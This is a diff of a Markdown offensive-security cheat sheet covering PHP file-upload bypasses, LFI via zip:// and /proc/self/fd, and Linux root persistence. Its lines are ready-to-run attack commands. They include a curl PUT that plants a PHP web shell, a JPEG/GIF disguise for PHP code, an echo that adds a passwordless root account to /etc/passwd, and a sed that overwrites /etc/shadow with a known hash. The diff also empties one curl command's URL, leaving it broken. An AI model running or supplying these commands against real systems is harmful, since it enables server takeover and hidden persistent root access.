@@ -242,6 +242,7 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 * file.gif \(contains php code, but starts with string GIF/GIF98\)
 * 00%
 * file.jpg with php backdoor in exif \(see below\)
+* .jpg -&gt; proxy intercept -&gt; rename to .php
 
 ### Injecting PHP into JPEG
 
@@ -331,7 +332,7 @@ mv payload.zip shell.jpg;
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 # Loop through file descriptors
-curl 'http://192.168.2.70/member.php?username=/proc/self/fd/[0-10] ' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
+curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
 ```
 
 ### Remote File Inclusion Shell: Windows + PHP
@@ -729,6 +730,13 @@ echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
 
 # Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
 sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
+```
+
+### Generating OpenSSL Password
+
+```bash
+openssl passwd -1 password 
+# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
 ```
 
 ### Persistent Back Doors
